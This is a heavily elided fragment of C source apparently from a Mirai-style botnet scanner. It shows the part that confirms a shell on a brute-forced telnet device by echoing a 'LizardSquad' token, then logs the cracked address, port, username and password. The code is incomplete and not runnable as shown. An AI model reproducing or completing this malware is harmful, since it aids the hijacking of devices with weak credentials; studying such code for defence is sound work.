                ...
                while (TRUE)
                {
                    ...
                    while (TRUE)
                    {
                        ...
                        case SC_WAITING_SH_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str = "echo -e LizardSquad";
                                int tmp_len = 19;
                        ...
                        case SC_WAITING_TOKEN_RESP:
                            ...
                            else if (consumed > 0)
                            {
                                ...
                                printf("[scanner] CRACKED ---> %s:%d %s:%s\n", conn->dst_addr, conn->dst_port, conn->auth->username, conn->auth->password);
                                close(conn->fd);
                                conn->fd = -1;
                                conn->state = SC_CLOSED;
                            }
...
{
    char *tkn_resp2 = "izardSquad";
	char *tkn_resp = "ncorrect";
    int prompt_ending, len = 8, len2 = 10;
    ...
    prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp2, len2 - 1);
